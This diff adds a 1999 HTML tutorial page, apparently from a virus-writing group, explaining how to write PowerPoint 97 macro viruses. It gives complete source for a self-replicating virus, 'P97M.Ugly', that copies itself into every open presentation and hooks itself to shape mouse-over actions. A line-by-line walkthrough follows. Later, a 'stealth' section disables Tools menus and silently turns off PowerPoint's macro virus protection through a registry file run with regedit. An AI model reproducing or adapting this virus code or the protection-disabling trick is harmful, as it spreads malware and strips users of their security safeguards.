@@ -1,0 +1,194 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Phreaky Macro Primer 0.1 - Powerpoint 97</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote>
+  <PRE><b>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=
+                                                      ?    ?    ?        
+                                                        ?  ____  
+                                                          /    \ ?
+      A phreaky macro primer v0.1                     ?  / \ _  \  ?
+      .by jackie / Metaphase                            ( .o o.  ) ___
+                                                      __/   ^    \/   \
+                                                     /  \___o____      \
+=-=[ PowerPoint 97 ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</b>
+
+     .Introduction to PowerPoint macros
+     .Infection hooks for PowerPoint
+     .The PowerPoint module macro
+     .Stealth technics for PowerPoint 
+
+   [ Music ]
+
+     .Napalm Death .Same
+     .Fear Factory .Demanufactore
+     .Creed .My Own Prison
+
+<b>
+.Introduction to PowerPoint macros</b>
+
+    Hi there!  Welcome to the Power  Point part.  First I would like to say
+that I don't like Power Point much, so don't expect too much. ;P Ok, PP has
+no template where we could get some kind of resisdent features.  So we need
+to run direct  action as in Access. Hmm ... I don't know if .ppt  files are
+traded a lot so I am not sure if PP macros really spread.
+
+    Other than in  Word,  we can't access the  registry directly and as you
+will see, some things will change.
+
+    If you never  coded anything in VBA  then I recommend you  to read also
+the introduction to Word, if you have read the Word part (I hope so) go on.
+
+<b>
+.Infection hooks for PowerPoint</b>
+
+    Here we have the main  change to all other kind  of macro bugs. PP does
+not have any build in hook we could use. So how do we get our virus execut-
+ed? The answer is easy,  we hook it to events  concerning the active slide.
+I won't explain this here to far, so just check the example below.
+
+ Sub AnySubName()
+
+ [...VirusCode...]
+
+ End Sub
+
+    As you see we can use every procedure in a module. We just need to hook
+this sub with  the shapes on our slide.  You will see how it's  done in the
+next section.
+
+<b>
+.The PowerPoint module macro</b>
+
+    In this section I will  give you a simple sample how a macro for Power-
+Point could look. This one is very basic and was written for this tutorial.
+
+---[ code starts here ]----------------------------------------------------
+
+ Sub Ugly()
+ On Error Resume Next
+ Set host = ActivePresentation.VBProject.VBComponents("ylgu").CodeModule
+ vcode = host.Lines(1, host.countoflines)
+
+ For Each newhost In Presentations
+  If newhost.VBProject.VBComponents(host).Name &lt;&gt; host Then
+   newhost.VBProject.VBComponents.Add(1).Name = host
+   newhost.VBProject.VBComponents(host).CodeModule.InsertLines 1, vcode
+    For Each ShapeHook In newhost.Slides(newhost.Slides.Count).Shapes
+     If ShapeHook.ActionSettings(ppMouseOver).Action = 0 Then _
+      ShapeHook.ActionSettings(ppMouseOver).Action = ppActionRunMacro: _
+       ShapeHook.ActionSettings(ppMouseOver).Run = "Ugly"
+    Next
+  End If
+ Next
+
+ If Day(Now()) = 1 Then MsgBox "Have you ever woke up screaming?" & _
+ vbCr & "Have you ever woke up alone?", vbInformation, "powerpoint.Ugly"
+ End Sub
+ 'P97M.Ugly
+ 'Written for 'A phreaky macro primer' by jackie / Metaphase
+
+---[ code ends here ]------------------------------------------------------
+
+    What you see here  is a working example  of a macro for PowerPoint.  As
+usual I will walk now through the code.
+
+---------------------------------------------------------------------------
+Sub Ugly()
+---------------------------------------------------------------------------
+
+    This is the sub that is  going to contain our viral code.  You will see
+later in code that we are going to hook this sub.
+
+---------------------------------------------------------------------------
+On Error Resume Next
+Set host = ActivePresentation.VBProject.VBComponents("ylgu").CodeModule
+vcode = host.Lines(1, host.countoflines)
+---------------------------------------------------------------------------
+
+    First line contains our error handler. You already know it. In the 2nd
+line we create an object containing our module. We need it later. After all
+we save our viral code into a variable.
+
+---------------------------------------------------------------------------
+For Each newhost In Presentations
+If newhost.VBProject.VBComponents(host).Name &lt;&gt; host Then
+---------------------------------------------------------------------------
+
+    All we  want is to infect  all open presentations.  For this purpose we
+create a nice For Each-Next loop.  Then we check if our module does already
+exist in the the current presentation.
+
+---------------------------------------------------------------------------
+newhost.VBProject.VBComponents.Add(1).Name = host
+newhost.VBProject.VBComponents(host).CodeModule.InsertLines 1, vcode
+---------------------------------------------------------------------------
+
+    We add a module to the presentation we want to infect and after that we
+insert our viral code into the new module.
+
+---------------------------------------------------------------------------
+For Each ShapeHook In newhost.Slides(newhost.Slides.Count).Shapes
+ If ShapeHook.ActionSettings(ppMouseOver).Action = 0 Then _
+  ShapeHook.ActionSettings(ppMouseOver).Action = ppActionRunMacro: _
+  ShapeHook.ActionSettings(ppMouseOver).Run = "Ugly"
+Next
+---------------------------------------------------------------------------
+
+    Here is now the  interesting part, here we hook our  macro with all the
+shapes on the infected presentation. First of all a loop for each shape. If
+there's no action set on the shape we hook it to our viral subroutine.
+
+---------------------------------------------------------------------------
+End If
+Next
+
+If Day(Now()) = 1 Then MsgBox "Have you ever woke up screaming?" & _
+vbCr & "Have you ever woke up alone?", vbInformation, "powerpoint.Ugly"
+End Sub
+---------------------------------------------------------------------------
+
+    End If and back  to the next presentation.  The code below is a paylaod
+as you can see.
+
+    As you see, infecting PowerPoint is very easy, but I don't like it. Now
+I am gonna say a little about stealth.
+
+
+<b>.Stealth technics for PowerPoint</b> 
+
+    Stealth in PowerPoint works equal to the stealth in Excel, etc. Here's
+shown how.
+
+ CommandBars("Tools").Controls(11).Enabled = False
+ CommandBars("Tools").Controls(14).Enabled = False
+
+    This should disable 2 important menus. To disable the virus protection
+of PowerPoint we can use the same trick as we use in Excel.
+
+    Open "c:\power.reg" For Output As 1
+    Print #1, "REGEDIT4"
+    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\" _
+                & "Office\8.0\PowerPoint\Options]"
+    Print #1, """MacroVirusProtection""=dword:00000000"
+    Close 1
+
+    Shell "regedit /s c:\power.reg",vbHide
+
+    You see,  the stealth possibilities are very  rare but you can also use
+some tricks that I  have explained in the Word section.  I am talking about
+the trick were you set new background colours in the VBEditor.
+
+
+    I am very sorry that this part is the shittiest of them all,  but must
+say that I really don't like PowerPoint. :) Now spotlight on Access 97.
+
+                               -End Of Part #4-
+
+<b>=-=[EOF]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=</b>
+</PRE>
+</blockquote>
+</BODY>
+</HTML>
